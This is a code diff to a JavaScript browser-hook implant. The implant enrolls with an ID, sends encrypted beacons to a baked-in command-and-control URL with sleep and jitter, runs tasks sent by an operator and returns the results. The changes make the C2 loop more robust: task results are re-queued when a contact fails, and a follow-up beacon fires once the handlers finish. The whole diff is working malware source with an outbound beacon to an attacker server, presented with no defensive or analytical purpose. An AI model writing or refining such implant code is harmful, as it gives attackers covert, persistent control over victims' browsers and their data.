@@ -305,7 +305,13 @@ var ROD_HOOK_BAKE = __ROD_BAKE_JSON__;
             var nonce = body.slice(18, 30);
             var sealed = body.slice(30);
             return keyPromise.then(function (key) {
-              return subtle.decrypt({ name: 'AES-GCM', iv: nonce, additionalData: utf8(aad), tagLength: 128 }, key, sealed);
+              return subtle
+                .decrypt({ name: 'AES-GCM', iv: nonce, additionalData: utf8(aad), tagLength: 128 }, key, sealed)
+                .then(function (plaintext) {
+                  // decrypt resolves an ArrayBuffer; every reader in this
+                  // script speaks Uint8Array.
+                  return new Uint8Array(plaintext);
+                });
             });
           },
         };
@@ -452,8 +458,13 @@ var ROD_HOOK_BAKE = __ROD_BAKE_JSON__;
     });
 
     return enrollment.then(function (implantId) {
-      var frames = [{ payload: handshakeBytes(implantId, bake.verbs, bake.sleep, bake.jitter), kind: 0 }].concat(outbox);
+      // The queued frames ride as a snapshot: a failed contact re-queues
+      // them (results are the task's answers, losing one strands the task
+      // Dispatched forever), while anything a handler queues mid-flight
+      // stays in the live outbox for the next cycle.
+      var pending = outbox;
       outbox = [];
+      var frames = [{ payload: handshakeBytes(implantId, bake.verbs, bake.sleep, bake.jitter), kind: 0 }].concat(pending);
       var plaintext = encodeFrames(frames);
 
       var request;
@@ -474,30 +485,40 @@ var ROD_HOOK_BAKE = __ROD_BAKE_JSON__;
         request = fetch(bake.beaconUrl, { method: 'POST', body: plaintext });
       }
 
-      return request.then(function (response) {
-        if (response.status === 401) {
-          // A replayed or mis-keyed body: the server's counter floor
-          // outlives this tab's memory (storage blocked, or the row aged
-          // past it). One fresh enrollment re-establishes identity.
-          dropState();
-          log('contact refused; dropping identity for a fresh enroll');
-          return;
-        }
-        if (!response.ok) throw new Error('beacon answered ' + response.status);
+      return request.then(
+        function (response) {
+          if (response.status === 401) {
+            // A replayed or mis-keyed body: the server's counter floor
+            // outlives this tab's memory (storage blocked, or the row aged
+            // past it). One fresh enrollment re-establishes identity.
+            dropState();
+            log('contact refused; dropping identity for a fresh enroll');
+            return;
+          }
+          if (!response.ok) {
+            // The answers this contact carried are still the task's
+            // answers: put them back for the next cycle.
+            outbox = pending.concat(outbox);
+            throw new Error('beacon answered ' + response.status);
+          }
 
-        var bodyBytes;
-        if (seal) {
-          return response
-            .text()
-            .then(function (text) {
-              return seal.open(b64ToBytes(text.trim()), 'rod-contact-response-v1');
-            })
-            .then(readInbound);
-        }
-        return response.arrayBuffer().then(function (buffer) {
-          readInbound(new Uint8Array(buffer));
-        });
-      });
+          if (seal) {
+            return response
+              .text()
+              .then(function (text) {
+                return seal.open(b64ToBytes(text.trim()), 'rod-contact-response-v1');
+              })
+              .then(readInbound);
+          }
+          return response.arrayBuffer().then(function (buffer) {
+            readInbound(new Uint8Array(buffer));
+          });
+        },
+        function (error) {
+          outbox = pending.concat(outbox);
+          throw error;
+        },
+      );
     });
   }
 
@@ -514,18 +535,19 @@ var ROD_HOOK_BAKE = __ROD_BAKE_JSON__;
       return;
     }
 
-    var handled = 0;
+    var runs = [];
     for (var i = 1; i < inbound.length; i++) {
       var task = parseTaskRequest(inbound[i].payload);
       if (!task.taskId || !task.verb) continue;
-      runTask(task);
-      handled++;
+      runs.push(runTask(task));
     }
-    if (handled && outbox.length) {
-      // The follow-up rides now rather than the cadence: the operator
-      // reads the answer seconds after issuing it, the store-and-forward
-      // shape the poll discipline already models.
-      setTimeout(tick, 1000);
+    if (runs.length) {
+      // The follow-up rides once the handlers settle, not the cadence: the
+      // operator reads the answer seconds after issuing it, the
+      // store-and-forward shape the poll discipline already models.
+      Promise.all(runs).then(function () {
+        if (outbox.length) setTimeout(tick, 1000);
+      });
     }
   }
 
@@ -549,6 +571,7 @@ var ROD_HOOK_BAKE = __ROD_BAKE_JSON__;
         output: String((error && error.message) || error),
       });
     });
+    return run;
   }
 
   function queueResult(task, ok, answer) {
